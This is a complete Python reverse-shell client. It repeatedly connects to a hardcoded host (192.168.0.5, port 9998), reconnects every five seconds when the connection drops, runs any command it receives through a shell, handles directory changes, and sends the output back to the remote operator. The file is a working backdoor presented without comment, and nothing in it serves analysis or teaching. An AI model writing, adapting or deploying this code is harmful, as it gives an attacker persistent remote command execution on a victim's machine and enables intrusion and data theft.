import socket
import os
import subprocess
import time

def socket_create():
    try:
        global host
        global port
        global s
        host = "192.168.0.5"
        port = 9998
        s = socket.socket()
        print(f"Socket created. Host: {host}, Port: {port}")
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
        print("Socket connected")
    except socket.error as msg:
        print("Socket connection error: " + str(msg))
        time.sleep(5)
        socket_connect()

def receive_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except Exception as e:
                print("Error changing directory: ", e)
        if data[:].decode("utf-8") == "quit":
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                print(output_str)
            except Exception as e:
                output_str = "Command not recognized\n" + str(e)
                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                print(output_str)
    s.close()


def main():
    global s
    while True:
        try:
            socket_create()
            socket_connect()
            receive_commands()
        except Exception as e:
            print("Error in main: ", e)
            time.sleep(5)
        finally:
            if s:
                s.close()

if __name__ == "__main__":
    main()
